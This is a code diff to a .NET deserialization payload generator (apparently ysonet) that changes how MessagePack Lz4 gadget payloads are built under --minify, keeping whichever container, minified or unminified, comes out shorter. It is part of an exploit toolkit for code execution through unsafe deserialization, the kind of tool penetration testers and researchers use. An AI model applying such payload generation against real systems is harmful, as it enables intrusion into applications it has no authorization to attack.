@@ -112,6 +112,13 @@ namespace ysonet.Generators
             return Formatters.BinaryFormatter;
         }
 
+        public override bool NeedsUnminifiedBridgedPayload(
+            string formatter, InputArgs inputArgs)
+        {
+            return inputArgs != null && inputArgs.Minify
+                && IsMessagePackLz4(formatter);
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             // Reject every formatter a variant opted out of, using the catalogue's
@@ -314,19 +321,45 @@ namespace ysonet.Generators
             else if (IsMessagePackTypeless(formatter))
             {
                 Console.WriteLine("\r\nThis version of the gadget works for MessagePack >= 2.3.75\r\n");
+                bool useLz4 = IsMessagePackLz4(formatter);
                 byte[] serializedData = BuildMessagePackTypeless(
-                    binaryFormatterPayload,
-                    IsMessagePackLz4(formatter));
+                    binaryFormatterPayload, useLz4);
 
-                if (inputArgs.Test)
+                // Minifying the nested BinaryFormatter stream usually helps, but a smaller
+                // input can compress a little worse. Compare complete Lz4 containers and
+                // keep the shorter one so --minify never expands this formatter cell. A
+                // normal direct generation can build its own raw inner candidate; a --bgc
+                // chain receives the corresponding candidate from PayloadRunner.
+                if (inputArgs != null && inputArgs.Minify && useLz4)
                 {
-                    try
+                    byte[] unminifiedBinaryFormatterPayload;
+                    if (BridgedPayload != null)
                     {
-                        MessagePackTypelessTypeSwap.Deserialize(serializedData, IsMessagePackLz4(formatter));
+                        if (UnminifiedBridgedPayload == null)
+                            throw new InvalidOperationException(Name() + " needs the unminified "
+                                + "bridge candidate to guarantee that --minify does not enlarge "
+                                + Formatters.MessagePackTypelessLz4 + ". Generate the chain "
+                                + "through PayloadRunner.");
+                        unminifiedBinaryFormatterPayload =
+                            (byte[])UnminifiedBridgedPayload;
                     }
-                    catch { }
+                    else
+                    {
+                        InputArgs unminifiedArgs = inputArgs.DeepCopy();
+                        unminifiedArgs.Minify = false;
+                        unminifiedArgs.Test = false;
+                        unminifiedBinaryFormatterPayload =
+                            (byte[])new TypeConfuseDelegateGenerator()
+                                .GenerateInner(Formatters.BinaryFormatter, unminifiedArgs);
+                    }
+
+                    byte[] unminifiedContainer = BuildMessagePackTypeless(
+                        unminifiedBinaryFormatterPayload, true);
+                    if (unminifiedContainer.Length < serializedData.Length)
+                        serializedData = unminifiedContainer;
                 }
-                return serializedData;
+
+                return FinishHandWrittenPayload(serializedData, formatter, inputArgs);
             }
             else
             {
